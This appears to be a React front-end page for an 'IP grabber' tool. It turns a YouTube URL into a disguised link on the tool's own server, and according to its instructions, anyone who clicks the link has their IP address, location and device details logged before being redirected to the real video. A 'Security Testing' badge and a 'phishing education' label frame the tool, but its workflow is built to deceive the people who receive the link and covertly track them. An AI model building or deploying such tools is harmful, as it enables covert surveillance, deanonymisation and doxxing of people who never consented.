
import { useState } from "react";
import { useQuery } from "@tanstack/react-query";
import { Youtube, Link2, Copy, Eye, ArrowLeft, Play, Shield } from "lucide-react";
import Sidebar from "@/components/dashboard/sidebar";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { useToast } from "@/hooks/use-toast";
import { useLocation } from "wouter";

export default function YoutubeProxy() {
  const [youtubeUrl, setYoutubeUrl] = useState("");
  const [generatedLink, setGeneratedLink] = useState("");
  const [location, setLocation] = useLocation();
  const { toast } = useToast();

  const extractVideoId = (url: string): string | null => {
    const patterns = [
      /(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/|youtube\.com\/v\/)([^&\n?#]+)/,
      /youtube\.com\/watch\?.*v=([^&\n?#]+)/
    ];
    
    for (const pattern of patterns) {
      const match = url.match(pattern);
      if (match) return match[1];
    }
    return null;
  };

  const generateTrackingLink = () => {
    if (!youtubeUrl.trim()) {
      toast({
        title: "Invalid URL",
        description: "Please enter a valid YouTube URL",
        variant: "destructive",
      });
      return;
    }

    const videoId = extractVideoId(youtubeUrl);
    if (!videoId) {
      toast({
        title: "Invalid YouTube URL",
        description: "Please enter a valid YouTube URL (youtube.com or youtu.be)",
        variant: "destructive",
      });
      return;
    }

    // Generate tracking link that looks like a YouTube URL but points to our server
    const trackingId = Math.random().toString(36).substring(2, 15);
    const fakeLink = `${window.location.origin}/yt/${trackingId}?v=${videoId}`;
    
    setGeneratedLink(fakeLink);
    
    toast({
      title: "Tracking Link Generated!",
      description: "Your YouTube tracking link is ready to use",
    });
  };

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      toast({
        title: "Copied!",
        description: "Link copied to clipboard",
      });
    } catch (error) {
      toast({
        title: "Copy Failed",
        description: "Failed to copy link to clipboard",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="flex h-screen bg-background">
      <Sidebar />
      <main className="flex-1 overflow-auto">
        {/* Header */}
        <header className="bg-card border-b border-border px-4 sm:px-6 py-4">
          <div className="flex flex-col space-y-4 sm:flex-row sm:items-center sm:justify-between sm:space-y-0">
            <div className="flex flex-col space-y-3 sm:flex-row sm:items-center sm:space-y-0 sm:space-x-3">
              <Button
                variant="ghost"
                size="sm"
                onClick={() => setLocation("/")}
                className="self-start sm:mr-2"
              >
                <ArrowLeft className="h-4 w-4 mr-1" />
                Back
              </Button>
              <div className="flex items-center space-x-3">
                <div className="w-8 h-8 bg-red-500/10 rounded-lg flex items-center justify-center">
                  <Youtube className="h-4 w-4 text-red-500" />
                </div>
                <div>
                  <h2 className="text-xl sm:text-2xl font-semibold text-foreground">YouTube Proxy</h2>
                  <p className="text-sm sm:text-base text-muted-foreground">Generate tracking links for YouTube videos</p>
                </div>
              </div>
            </div>
            <div className="flex items-center space-x-2">
              <Badge variant="outline" className="bg-red-500/10 text-red-500 border-red-500/20">
                <Shield className="h-3 w-3 mr-1" />
                Security Testing
              </Badge>
            </div>
          </div>
        </header>

        <div className="p-4 sm:p-6 space-y-6 max-w-4xl">
          {/* Instructions */}
          <Card className="border-yellow-500/20 bg-yellow-500/5">
            <CardHeader>
              <CardTitle className="flex items-center space-x-2 text-yellow-600">
                <Play className="h-5 w-5" />
                <span>How It Works</span>
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-3 text-sm">
              <div className="flex items-start space-x-2">
                <span className="text-yellow-600 font-bold">1.</span>
                <p>Paste any YouTube video URL (youtube.com or youtu.be format)</p>
              </div>
              <div className="flex items-start space-x-2">
                <span className="text-yellow-600 font-bold">2.</span>
                <p>Click "Generate Tracking Link" to create a fake YouTube URL</p>
              </div>
              <div className="flex items-start space-x-2">
                <span className="text-yellow-600 font-bold">3.</span>
                <p>Share the generated link - when clicked, it logs IP data then redirects to the real video</p>
              </div>
              <div className="flex items-start space-x-2">
                <span className="text-yellow-600 font-bold">4.</span>
                <p>Monitor captured data in the Log Entries section</p>
              </div>
            </CardContent>
          </Card>

          {/* YouTube URL Input */}
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center space-x-2">
                <Youtube className="h-5 w-5" />
                <span>YouTube Video URL</span>
              </CardTitle>
              <CardDescription>
                Enter the YouTube video URL you want to track
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <label htmlFor="youtube-url" className="text-sm font-medium">
                  YouTube URL
                </label>
                <div className="flex space-x-2">
                  <Input
                    id="youtube-url"
                    type="url"
                    placeholder="https://www.youtube.com/watch?v=dQw4w9WgXcQ"
                    value={youtubeUrl}
                    onChange={(e) => setYoutubeUrl(e.target.value)}
                    className="flex-1"
                  />
                  <Button onClick={generateTrackingLink} className="bg-red-600 hover:bg-red-700">
                    <Link2 className="h-4 w-4 mr-2" />
                    Generate
                  </Button>
                </div>
              </div>
              
              {/* Examples */}
              <div className="text-xs text-muted-foreground space-y-1">
                <p><strong>Supported formats:</strong></p>
                <p>• https://www.youtube.com/watch?v=VIDEO_ID</p>
                <p>• https://youtu.be/VIDEO_ID</p>
                <p>• https://youtube.com/embed/VIDEO_ID</p>
              </div>
            </CardContent>
          </Card>

          {/* Generated Link */}
          {generatedLink && (
            <Card className="border-green-500/20 bg-green-500/5">
              <CardHeader>
                <CardTitle className="flex items-center space-x-2 text-green-600">
                  <Eye className="h-5 w-5" />
                  <span>Generated Tracking Link</span>
                </CardTitle>
                <CardDescription>
                  Share this link to track IP addresses while allowing video viewing
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="p-4 bg-card border border-green-500/20 rounded-lg">
                  <div className="flex items-center justify-between space-x-2">
                    <code className="text-sm break-all text-green-600 font-mono">
                      {generatedLink}
                    </code>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => copyToClipboard(generatedLink)}
                      className="shrink-0"
                    >
                      <Copy className="h-4 w-4" />
                    </Button>
                  </div>
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <h4 className="font-medium text-sm">✅ What happens when clicked:</h4>
                    <ul className="text-xs text-muted-foreground space-y-1">
                      <li>• Captures visitor's IP address</li>
                      <li>• Logs location and device info</li>
                      <li>• Redirects to actual YouTube video</li>
                      <li>• Video plays normally</li>
                    </ul>
                  </div>
                  <div className="space-y-2">
                    <h4 className="font-medium text-sm">🎯 Perfect for:</h4>
                    <ul className="text-xs text-muted-foreground space-y-1">
                      <li>• Security testing</li>
                      <li>• Social engineering awareness</li>
                      <li>• Phishing education</li>
                      <li>• IP geolocation testing</li>
                    </ul>
                  </div>
                </div>

                <div className="flex space-x-2">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => window.open(generatedLink, '_blank')}
                  >
                    <Play className="h-4 w-4 mr-2" />
                    Test Link
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setLocation("/logs")}
                  >
                    <Eye className="h-4 w-4 mr-2" />
                    View Logs
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}
        </div>
      </main>
    </div>
  );
}
